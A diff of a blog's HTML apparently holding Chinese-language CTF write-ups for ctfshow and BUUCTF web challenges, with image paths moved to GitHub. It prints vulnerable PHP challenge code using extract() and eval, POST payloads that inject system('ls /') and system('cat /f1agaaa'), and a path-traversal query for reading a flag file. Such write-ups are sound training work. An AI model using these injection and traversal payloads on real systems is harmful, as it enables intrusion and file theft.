@@ -190,7 +190,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2023-07-29 15:25:16 / Modified: 16:32:21" itemprop="dateCreated datePublished" datetime="2023-07-29T15:25:16+08:00">2023-07-29</time>
+              <time title="Created: 2023-07-29 15:25:16 / Modified: 16:39:22" itemprop="dateCreated datePublished" datetime="2023-07-29T15:25:16+08:00">2023-07-29</time>
             </span>
 
           
@@ -216,17 +216,17 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie: CTFshow-QQ%E7%BE%A4:=a</span><br><span class="line">GET: ?b=c</span><br><span class="line">POST: a=b&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
 
 <p>得到</p>
-<p><img src="F:\blog\public\images\image-20230729161126553.png" alt="image-20230729161126553"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161126553.png?raw=true" alt="image-20230729161126553"></p>
 <p>查看f1agaaa</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie: CTFshow-QQ%E7%BE%A4:=a</span><br><span class="line">GET: ?b=c</span><br><span class="line">POST: a=b&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>
 
 <p>得到flag</p>
 <h2 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h2><p>查看源代码</p>
-<p><img src="F:\blog\public\images\image-20230729161351928.png" alt="image-20230729161351928"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161351928.png?raw=true" alt="image-20230729161351928"></p>
 <p>给出一般的flag，剩下的提示在控制台</p>
-<p><img src="F:\blog\public\images\image-20230729161420515.png" alt="image-20230729161420515"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161420515.png?raw=true" alt="image-20230729161420515"></p>
 <p>提示运行<code>g1ve_flag()</code></p>
-<p><img src="F:\blog\public\images\image-20230729161502774.png" alt="image-20230729161502774"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729161502774.png?raw=true" alt="image-20230729161502774"></p>
 <p><code>ctfshow&#123;We1c0me_t0_jo1n_u3_!&#125;</code></p>
 <h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 08:21:54</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment"># 将post上来的数据直接都解析成变量的形式，在代码中可以直接使用</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class="line"><span class="comment">//变量嵌套</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
 
@@ -238,7 +238,7 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
 
-<p><img src="F:\blog\public\images\image-20230729162920083.png" alt="image-20230729162920083"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729162920083.png?raw=true" alt="image-20230729162920083"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>
 
 
@@ -295,7 +295,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2023-07-29 15:20:07 / Modified: 15:58:20" itemprop="dateCreated datePublished" datetime="2023-07-29T15:20:07+08:00">2023-07-29</time>
+              <time title="Created: 2023-07-29 15:20:07 / Modified: 16:40:38" itemprop="dateCreated datePublished" datetime="2023-07-29T15:20:07+08:00">2023-07-29</time>
             </span>
 
           
@@ -309,16 +309,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="buuctf-web"><a href="#buuctf-web" class="headerlink" title="buuctf(web)"></a>buuctf(web)</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="F:\blog\public\images\image-20230729153522620.png" alt="image-20230729153522620"></p>
+          <h1 id="buuctf-web"><a href="#buuctf-web" class="headerlink" title="buuctf(web)"></a>buuctf(web)</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729153522620.png?raw=true" alt="image-20230729153522620"></p>
 <h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看页内源代码</p>
-<p><img src="F:\blog\public\images\image-20230729153638339.png" alt="image-20230729153638339"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729153638339.png?raw=true" alt="image-20230729153638339"></p>
 <p>传参<code>?cat=dog</code></p>
 <p><code>       flag&#123;d244a78c-5ad2-48b1-a2db-8d6e98a8f3e6&#125;       </code></p>
 <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>查看源代码发现有</p>
 <p><code>source.php</code>其中有一个<code>hint.php</code></p>
-<p><img src="F:\blog\public\images\image-20230729155305303.png" alt="image-20230729155305303"></p>
+<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230729155305303.png?raw=true" alt="image-20230729155305303"></p>
 <p><code>?file=hint.php?../../../../../ffffllllaaaagggg</code></p>
-<p>进行目录遍历</p>
+<p>进行目录遍历，得到flag</p>
 
       
     </div>
